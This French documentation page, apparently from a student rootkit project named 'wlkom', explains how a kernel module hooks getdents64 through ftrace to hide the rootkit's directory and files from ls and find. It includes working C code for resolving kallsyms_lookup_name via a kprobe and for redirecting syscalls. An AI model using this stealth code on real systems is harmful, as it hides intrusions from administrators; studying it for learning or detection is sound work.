---
title: Cacher les fichiers & répertoires
description: Hooke getdents64 via ftrace pour retirer le répertoire du rootkit de tout listage de répertoire.
---

**Optionnel · 2 pts**

Hooke `getdents64` via ftrace pour retirer le répertoire du rootkit de tout listage de répertoire.

## Fonctionnement

Chaque outil qui liste des fichiers — `ls`, `find`, `stat` — finit par appeler le syscall **`getdents64`**. Le hook l'intercepte de deux façons :

1. **Dissimulation au niveau répertoire** — si le descripteur de fichier pointe vers un répertoire de `hidden_dirs[]` (comparé par inode), le hook retourne `0` immédiatement, faisant apparaître le répertoire comme complètement vide.
2. **Dissimulation au niveau entrée** — pour tous les autres répertoires, le hook laisse le vrai `getdents64` s'exécuter, copie le buffer en espace noyau, supprime les entrées dont `d_name` commence par un préfixe de `hide_prefixes[]`, puis réécrit le buffer filtré en userland.

## Pourquoi ftrace plutôt que le patch CR0

L'approche classique des rootkits — effacer le bit **WP (Write Protect)** du CR0, puis patcher directement la table des syscalls — **a échoué sur notre VM Arch Linux** pour deux raisons cumulées :

**`CONFIG_STRICT_KERNEL_RWX`** est activé par défaut sur les noyaux Arch Linux récents. Cette option configure la MMU pour enforcer les permissions des pages noyau indépendamment de CR0. Même avec le bit WP effacé, toute écriture dans une page marquée read-only par la MMU déclenche immédiatement une **page fault** qui panic le noyau.

```
[  42.317] BUG: unable to handle page fault for address: ffffffffc0a3e120
[  42.317] #PF: supervisor write access in kernel mode
[  42.317] #PF: error_code(0x0003) - permissions violation
```

**ftrace** est la bonne alternative. Le noyau compile chaque fonction avec une instruction `call __fentry__` en tout début de corps. ftrace exploite ces emplacements pour injecter des callbacks sans toucher aux pages read-only — il écrit via `text_poke()`, qui utilise un mapping temporaire en écriture, entièrement compatible avec `CONFIG_STRICT_KERNEL_RWX`.

```
__x64_sys_getdents64:
  call __fentry__     ← ftrace redirige ici vers notre callback
  push rbp
  ...
```

## Résolution des symboles — `get_symbol()`

Depuis le kernel **5.7**, `kallsyms_lookup_name()` n'est plus exportée. Elle est retrouvée via un kprobe : après `register_kprobe()`, le champ `kp.addr` contient son adresse réelle, qu'on peut ensuite appeler comme une fonction ordinaire pour résoudre n'importe quel autre symbole noyau.

```c
static unsigned long get_symbol(const char *name)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    typedef unsigned long (*kln_t)(const char *);
    kln_t kln;

    if (register_kprobe(&kp))
        return 0;

    kln = (kln_t)kp.addr;
    unregister_kprobe(&kp);
    return kln(name);
}
```

Utilisée dans `hide_files_init()` pour localiser `__x64_sys_getdents64` et `__x64_sys_read` au chargement du module.

## Structure d'un hook ftrace

Chaque hook suit la même architecture en trois éléments :

**1. Pointeur vers la fonction originale** — sauvegardé pour l'appeler depuis le hook sans récursion infinie.

```c
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
```

**2. Callback ftrace** — reçoit la signature imposée par ftrace. Il redirige `regs->ip` vers notre hook uniquement si l'appelant ne vient pas de notre propre module (guard `within_module`), évitant la récursion infinie quand le hook appelle l'original.

```c
static void notrace ftrace_callback(unsigned long ip,
                                     unsigned long parent_ip,
                                     struct ftrace_ops *ops,
                                     struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook_getdents64;
}
```

**3. Structure `ftrace_ops`** — déclare le callback et ses flags :

```c
static struct ftrace_ops getdents64_ops = {
    .func  = ftrace_callback,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY,
};
```

`FTRACE_OPS_FL_SAVE_REGS` est requis pour avoir un `pt_regs` valide dans le callback. `FTRACE_OPS_FL_IPMODIFY` est requis pour autoriser la modification de `regs->ip`.

## Flux de `hook_getdents64`

```
ls /
  → hook intercepte
      → fd inode dans hidden_dirs[] ? → return 0 (vide)
      → sinon : appelle orig_getdents64 → copie buffer noyau
          → pour chaque entrée dirent :
              → nom commence par "wlkom" ou "rootkit" ? → supprime (memmove)
          → copy_to_user buffer filtré, retourne nouvelle taille
```

## Initialisation et nettoyage

**`hide_files_init()`** — appelée depuis `wlkom_init()` :
1. Pour chaque chemin dans `hidden_dirs[]`, résout l'inode via `kern_path()` et le sauvegarde dans `hidden_inodes[]` avec `igrab()` (incrémente le refcount pour que l'inode reste valide même si le répertoire est démonté)
2. Résout `__x64_sys_getdents64` via `get_symbol()`
3. Configure `getdents64_ops` et installe le hook via `ftrace_set_filter_ip()` + `register_ftrace_function()`
4. Répète les étapes 2–3 pour `__x64_sys_read`

**`hide_files_exit()`** — appelée depuis `wlkom_exit()` :
1. Libère les références d'inodes avec `iput()` pour chaque entrée de `hidden_inodes[]`
2. Désenregistre les deux hooks via `unregister_ftrace_function()` et retire les filtres

:::caution[Le nettoyage est critique]
Si le module est déchargé pendant que ftrace tente encore d'appeler un callback dont le code n'existe plus en mémoire, le résultat est un kernel panic immédiat. Le nettoyage propre dans `hide_files_exit()` est indispensable.
:::

## Configuration

| Constante | Rôle |
|-----------|------|
| `hide_prefixes[]` | Préfixes de noms supprimés des résultats `getdents64` |
| `hidden_dirs[]` | Répertoires qui apparaissent complètement vides |
| `hide_lines[]` | Marqueurs de lignes filtrées dans `read()` (voir Cacher les lignes) |

## Vérification

```sh
$ ls /
bin  boot  dev  etc  home  lib  ...
# /rootkit n'apparaît pas

$ ls /rootkit
# ls: cannot access '/rootkit': No such file or directory

$ find / -name "wlkom.ko" 2>/dev/null
# pas de sortie
```
